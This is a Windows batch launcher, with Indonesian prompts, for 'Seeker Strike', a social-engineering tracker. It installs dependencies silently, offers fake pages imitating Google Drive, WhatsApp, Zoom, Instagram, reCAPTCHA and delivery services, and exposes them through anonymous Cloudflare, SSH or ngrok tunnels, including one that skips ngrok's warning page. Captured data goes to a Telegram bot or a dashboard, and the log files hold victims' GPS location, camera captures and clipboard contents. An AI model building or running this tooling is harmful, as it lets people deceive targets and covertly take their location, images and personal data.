@echo off
title SEEKER STRIKE
setlocal enabledelayedexpansion

cd /d "%~dp0"

:: ========================
:: CLEANUP OLD PROCESSES
:: ========================
echo Membersihkan proses lama...
taskkill /F /IM php.exe /T >nul 2>&1
taskkill /F /IM ssh.exe /T >nul 2>&1
taskkill /F /IM ngrok.exe /T >nul 2>&1
taskkill /F /IM cloudflared.exe /T >nul 2>&1

for /f "tokens=5" %%a in ('netstat -aon ^| findstr :8080 ^| findstr LISTENING') do (
    taskkill /F /PID %%a >nul 2>&1
)

if exist "pid" del /q "pid" >nul 2>&1

:: ========================
:: AUTO-INSTALL REQUIREMENTS
:: ========================
echo.
echo ==========================================================
echo          MEMERIKSA DAN MENGINSTALL DEPENDENSI
echo ==========================================================
echo.

:: ========================
:: PHP
:: ========================
set "PHP_PATH="
:: Cari di PATH dulu
where php >nul 2>&1
if %errorlevel% equ 0 (
    for /f "tokens=*" %%i in ('where php') do set "PHP_PATH=%%~dpi"
    echo [OK] PHP sudah terinstall [!PHP_PATH!]
) else (
    :: Cari di winget packages
    set "WINGET_PATH=%LOCALAPPDATA%\Microsoft\WinGet\Packages"
    if exist "!WINGET_PATH!" (
        for /d %%d in ("!WINGET_PATH!\PHP.PHP.*") do (
            if exist "%%d\php.exe" set "PHP_PATH=%%d\" & goto :php_found
        )
    )
    :: Cari di Program Files
    if exist "%ProgramFiles%\php\php.exe" set "PHP_PATH=%ProgramFiles%\php\" & goto :php_found
    if exist "%ProgramFiles(x86)%\php\php.exe" set "PHP_PATH=%ProgramFiles(x86)%\php\" & goto :php_found

    :: Gak ketemu dimana pun — auto-install
    echo [!] PHP tidak ditemukan. Menginstall PHP 8.4...
    winget install -e --id PHP.PHP.8.4 --accept-package-agreements --silent
    if !errorlevel! neq 0 (
        echo [!] Gagal install PHP. Install manual:
        echo     winget install -e --id PHP.PHP.8.4
        pause
        exit /b 1
    )
    :: Cari ulang setelah install
    for /d %%d in ("!WINGET_PATH!\PHP.PHP.*") do (
        if exist "%%d\php.exe" set "PHP_PATH=%%d\" & goto :php_found
    )
    for /f "tokens=*" %%i in ('where php 2^>nul') do set "PHP_PATH=%%~dpi"
    :php_found
    if defined PHP_PATH (
        echo [OK] PHP 8.4 terinstall [!PHP_PATH!]
    ) else (
        echo [!] PHP masih belum ketemu. Coba restart cmd.
        pause
        exit /b 1
    )
)
if defined PHP_PATH set "PATH=%PATH%;%PHP_PATH%"

:: ========================
:: Python
:: ========================
set "PYTHON_CMD="
set "PYTHON_PATH="

where python >nul 2>&1
if %errorlevel% equ 0 (
    set "PYTHON_CMD=python"
    for /f "tokens=*" %%i in ('where python') do set "PYTHON_PATH=%%~dpi"
    echo [OK] Python sudah terinstall [!PYTHON_PATH!]
) else (
    where python3 >nul 2>&1
    if !errorlevel! equ 0 (
        set "PYTHON_CMD=python3"
        for /f "tokens=*" %%i in ('where python3') do set "PYTHON_PATH=%%~dpi"
        echo [OK] Python sudah terinstall [!PYTHON_PATH!]
    ) else (
        :: Cek di winget packages
        set "WINGET_PATH=%LOCALAPPDATA%\Microsoft\WinGet\Packages"
        if exist "!WINGET_PATH!" (
            for /d %%d in ("!WINGET_PATH!\Python.Python.*") do (
                if exist "%%d\python.exe" set "PYTHON_PATH=%%d\" & goto :python_found_path
            )
        )
        if exist "%ProgramFiles%\Python312\python.exe" set "PYTHON_PATH=%ProgramFiles%\Python312\" & goto :python_found_path
        if exist "%ProgramFiles%\Python313\python.exe" set "PYTHON_PATH=%ProgramFiles%\Python313\" & goto :python_found_path
        if exist "%LocalAppData%\Programs\Python\Python312\python.exe" set "PYTHON_PATH=%LocalAppData%\Programs\Python\Python312\" & goto :python_found_path
        if exist "%LocalAppData%\Programs\Python\Python313\python.exe" set "PYTHON_PATH=%LocalAppData%\Programs\Python\Python313\" & goto :python_found_path

        :: Gak ketemu — auto-install
        echo [!] Python tidak ditemukan. Menginstall Python 3.12...
        winget install -e --id Python.Python.3.12 --accept-package-agreements --silent
        if !errorlevel! neq 0 (
            echo [!] Gagal install Python. Install manual dari python.org
            pause
            exit /b 1
        )
        for /d %%d in ("!WINGET_PATH!\Python.Python.*") do (
            if exist "%%d\python.exe" set "PYTHON_PATH=%%d\" & goto :python_found_path
        )
        for /f "tokens=*" %%i in ('where python 2^>nul') do set "PYTHON_PATH=%%~dpi"
        :python_found_path
        set "PYTHON_CMD=python"
        if defined PYTHON_PATH (
            echo [OK] Python 3.12 terinstall [!PYTHON_PATH!]
        ) else (
            echo [!] Python masih belum ketemu. Coba restart cmd.
            pause
            exit /b 1
        )
    )
)
if defined PYTHON_PATH set "PATH=%PATH%;%PYTHON_PATH%"

:: ========================
:: Python Modules
:: ========================
echo.
echo [!] Memeriksa Python modules...
%PYTHON_CMD% -m pip install requests packaging psutil --quiet
if %errorlevel% equ 0 (
    echo [OK] Python modules siap.
) else (
    echo [!] Gagal install Python modules. Coba manual:
    echo     %PYTHON_CMD% -m pip install requests packaging psutil
    pause
    exit /b 1
)

:: ========================
:: OpenSSH Client
:: ========================
where ssh >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] OpenSSH Client sudah terinstall.
) else (
    echo [!] OpenSSH Client belum terinstall. Menginstall...
    winget install -e --id Microsoft.OpenSSH.Beta --accept-package-agreements --silent 2>nul
    if !errorlevel! neq 0 (
        dism /Online /Add-Capability /CapabilityName:OpenSSH.Client~~~~0.0.1.0 /Quiet /NoRestart 2>nul
    )
    :: Refresh PATH
    set "SSH_PATH="
    for /f "tokens=*" %%i in ('where ssh 2^>nul') do set "SSH_PATH=%%~dpi"
    if defined SSH_PATH (
        set "PATH=%PATH%;%SSH_PATH%"
        echo [OK] OpenSSH Client terinstall.
    ) else (
        echo [!] OpenSSH masih belum ketemu. Install manual:
        echo     Settings ^> Apps ^> Optional Features ^> OpenSSH Client
    )
)

:: ========================
:: cloudflared
:: ========================
where cloudflared >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] cloudflared sudah terinstall.
) else (
    echo [!] cloudflared belum terinstall. Menginstall...
    winget install -e --id Cloudflare.cloudflared --accept-package-agreements --silent
    if !errorlevel! neq 0 (
        echo [!] Gagal install cloudflared. Download manual:
        echo     https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/
    ) else (
        echo [OK] cloudflared terinstall.
    )
)

:: ========================
:: ngrok
:: ========================
where ngrok >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] ngrok sudah terinstall.
) else (
    echo [!] ngrok belum terinstall. Mendownload...
    set "NGROK_URL=https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    set "NGROK_ZIP=%TEMP%\ngrok.zip"
    powershell -Command "& {param($u,$z,$d) [Net.ServicePointManager]::SecurityProtocol='tls12'; try{Invoke-WebRequest -Uri $u -OutFile $z -UseBasicParsing -ErrorAction Stop; Expand-Archive -Path $z -DestinationPath $d -Force; Write-Output 'OK'}catch{Write-Output 'FAIL'}}" -ArgumentList "!NGROK_URL!", "!NGROK_ZIP!", "%~dp0"
    if exist "%~dp0ngrok.exe" (
        echo [OK] ngrok terinstall di direktori script.
    ) else (
        echo [!] Gagal download ngrok. Coba manual:
        echo     https://ngrok.com/download
    )
)

echo.
echo ==========================================================
echo            SEMUA DEPENDENSI SIAP
echo ==========================================================
timeout /t 2 >nul

:: ========================
:: DATABASE CLEANUP
:: ========================
cls
echo ==========================================================
echo                SEEKER STRIKE
echo        OSINT + Social Engineering Tracker
echo ==========================================================
echo.
set /p "CLEAR_DB=Hapus riwayat database lama? [Y/N] (Default: N): "
if /i "!CLEAR_DB!"=="Y" (
    echo Membersihkan database dan logs...
    type nul > "db\results.csv" 2>nul
    echo []> "db\results.json"
    echo const seeker_results = [];> "db\results.js"
    if exist "logs\*.info.json" del /q "logs\*.info.json" 2>nul
    if exist "logs\*.gps.json" del /q "logs\*.gps.json" 2>nul
    if exist "logs\*.camera.json" del /q "logs\*.camera.json" 2>nul
    if exist "logs\*.clipboard.json" del /q "logs\*.clipboard.json" 2>nul
    if exist "db\captures\*.jpg" del /q "db\captures\*.jpg" 2>nul
    echo Database dibersihkan!
    timeout /t 1 >nul
)

:: ========================
:: TELEGRAM BOT SETUP
:: ========================
set "TELEGRAM_VAL="
if exist ".env" (
    for /f "tokens=1,* delims==" %%a in ('findstr /b "TELEGRAM=" .env 2^>nul') do set "TELEGRAM_VAL=%%b"
)
if defined TELEGRAM_VAL set "TELEGRAM_VAL=!TELEGRAM_VAL: =!"
if defined TELEGRAM_VAL set "TELEGRAM_VAL=!TELEGRAM_VAL:"=!"

if not defined TELEGRAM_VAL (
    echo.
    echo [ ? ] Mau isi bot token dan chat ID Telegram?
    echo         Format: bot_token:chat_id
    echo         Contoh: 1234567890:ABCdef...:123456789
    set /p "INPUT_TG=Isi sekarang? (kosongkan = lewati): "
    if defined INPUT_TG (
        if not "!INPUT_TG!"=="" (
            set "TELEGRAM_VAL=!INPUT_TG!"
            setlocal disabledelayedexpansion
            powershell -Command "(Get-Content '.env') -replace '^TELEGRAM=.*', 'TELEGRAM=%INPUT_TG%' | Set-Content '.env'"
            setlocal enabledelayedexpansion
            echo.
            echo [ OK ] Token disimpan ke .env
        )
    )
)

:: ========================
:: TEMPLATE MENU
:: ========================
cls
echo ==========================================================
echo            PILIH TEMPLATE
echo ==========================================================
echo.
echo  [0] NearYou
echo  [1] Google Drive
echo  [2] WhatsApp
echo  [3] WhatsApp Redirect
echo  [4] Telegram
echo  [5] Zoom
echo  [6] Google ReCaptcha
echo  [7] Custom OG Tags
echo  [8] Instagram
echo  [9] YouTube Age Verify
echo  [10] E-commerce
echo  [11] Package Delivery
echo.
set /p "TEMPLATE_CHOICE=Pilih template [0-11] (Default: 0): "
if "!TEMPLATE_CHOICE!"=="" set "TEMPLATE_CHOICE=0"
set "TEMPLATE_CHOICE=!TEMPLATE_CHOICE:"=!"
if "!TEMPLATE_CHOICE!"=="0" set "TEMPLATE_NAME=NearYou"
if "!TEMPLATE_CHOICE!"=="1" set "TEMPLATE_NAME=Google Drive"
if "!TEMPLATE_CHOICE!"=="2" set "TEMPLATE_NAME=WhatsApp"
if "!TEMPLATE_CHOICE!"=="3" set "TEMPLATE_NAME=WhatsApp Redirect"
if "!TEMPLATE_CHOICE!"=="4" set "TEMPLATE_NAME=Telegram"
if "!TEMPLATE_CHOICE!"=="5" set "TEMPLATE_NAME=Zoom"
if "!TEMPLATE_CHOICE!"=="6" set "TEMPLATE_NAME=Google ReCaptcha"
if "!TEMPLATE_CHOICE!"=="7" set "TEMPLATE_NAME=Custom OG Tags"
if "!TEMPLATE_CHOICE!"=="8" set "TEMPLATE_NAME=Instagram"
if "!TEMPLATE_CHOICE!"=="9" set "TEMPLATE_NAME=YouTube Age Verify"
if "!TEMPLATE_CHOICE!"=="10" set "TEMPLATE_NAME=E-commerce"
if "!TEMPLATE_CHOICE!"=="11" set "TEMPLATE_NAME=Package Delivery"
echo Template: !TEMPLATE_NAME! [!TEMPLATE_CHOICE!]
echo.

:: ========================
:: DATA DELIVERY METHOD
:: ========================
cls
echo ==========================================================
echo         METODE PENGIRIMAN DATA
echo ==========================================================
echo.
echo  [1] Bot Telegram aja   (notif via Telegram)
echo  [2] Dashboard aja      (pantau via browser)
echo  [3] Keduanya           (Telegram + Dashboard)
echo.
set /p "SEND_METHOD=Pilih [1-3] (Default: 3): "
if "!SEND_METHOD!"=="" set "SEND_METHOD=3"

set "TG_FLAG="
set "NO_DASH_FLAG="

if "!SEND_METHOD!"=="1" (
    set "TG_FLAG=-tg !TELEGRAM_VAL!"
    set "NO_DASH_FLAG=--no-dashboard"
)
if "!SEND_METHOD!"=="3" (
    set "TG_FLAG=-tg !TELEGRAM_VAL!"
)

:: ========================
:: TUNNEL MENU
:: ========================
cls
echo ==========================================================
echo            PILIH METODE TUNNEL
echo ==========================================================
echo.
echo   [1] SSH  localhost.run        (no warning, tanpa install)
echo   [2] Cloudflare Tunnel         (no warning, anonymous URL)
echo   [3] ngrok + CF Worker         (auto bypass warning page)
echo.
echo  NOTE: [2] Cloudflare Tunnel = paling recommended, no warning,
echo        URL random anonymous, tidak perlu CF Worker.
echo        [3] ngrok + CF Worker = fallback kalau cloudflared error.
echo        [1] SSH = paling simple, tapi kadang down.
echo.
set /p "TUNNEL_CHOICE=Pilih [1-3] (Default: 2): "
if "!TUNNEL_CHOICE!"=="" set "TUNNEL_CHOICE=2"

if "!TUNNEL_CHOICE!"=="1" goto :tunnel_ssh
if "!TUNNEL_CHOICE!"=="2" goto :tunnel_cloudflare
if "!TUNNEL_CHOICE!"=="3" goto :tunnel_ngrok_cf
goto :tunnel_cloudflare

:: ========================
:: TUNNEL: SSH localhost.run
:: ========================
:tunnel_ssh
echo.
echo [1/2] Membuka tunnel ke localhost.run...
start "Seeker Tunnel (SSH)" cmd /k "title localhost.run && echo Menghubungkan ke localhost.run... && echo ^(Tunggu link HTTPS muncul di sini^) && ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:8080 nokey@localhost.run"
goto :run_seeker

:: ========================
:: TUNNEL: Cloudflare Tunnel
:: ========================
:tunnel_cloudflare
echo.
echo [1/2] Membuka Cloudflare Tunnel...

where cloudflared >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] cloudflared tidak ditemukan.
    echo     Install: winget install Cloudflare.cloudflared
    pause
    exit /b 1
)

start "Seeker Tunnel (Cloudflare)" cmd /k "title Cloudflare Tunnel && echo Menghubungkan ke Cloudflare Tunnel... && cloudflared tunnel --url http://127.0.0.1:8080"
goto :run_seeker

:: ========================
:: TUNNEL: ngrok + CF Worker
:: ========================
:tunnel_ngrok_cf
echo.
echo [1/2] Menjalankan ngrok + CF Worker setup...
%PYTHON_CMD% cf_setup.py
goto :run_seeker

:: ========================
:: RUN SEEKER
:: ========================
:run_seeker
cls
echo ==========================================================
echo            SEEKER STRIKE
echo ==========================================================
echo.
echo PETUNJUK:
echo   - Jendela tunnel ada di taskbar (lihat judulnya)
echo   - Tunggu URL tunnel muncul di jendela tunnel
echo   - Atau biarin auto-shorten dapetin URL nya
if "!SEND_METHOD!"=="2" echo   - Pantau data di dashboard (otomatis terbuka)
if "!SEND_METHOD!"=="1" echo   - Notifikasi via Telegram (dashboard gak dibuka)
if "!SEND_METHOD!"=="3" echo   - Telegram + Dashboard (keduanya aktif)
echo.
echo [2/2] Menjalankan Seeker Strike...
echo.

set "EXTRA_FLAGS=--template !TEMPLATE_CHOICE! --skip-tunnel-menu"
if defined TG_FLAG set "EXTRA_FLAGS=!EXTRA_FLAGS! !TG_FLAG!"
if defined NO_DASH_FLAG set "EXTRA_FLAGS=!EXTRA_FLAGS! !NO_DASH_FLAG!"

%PYTHON_CMD% seeker.py !EXTRA_FLAGS!

echo.
pause
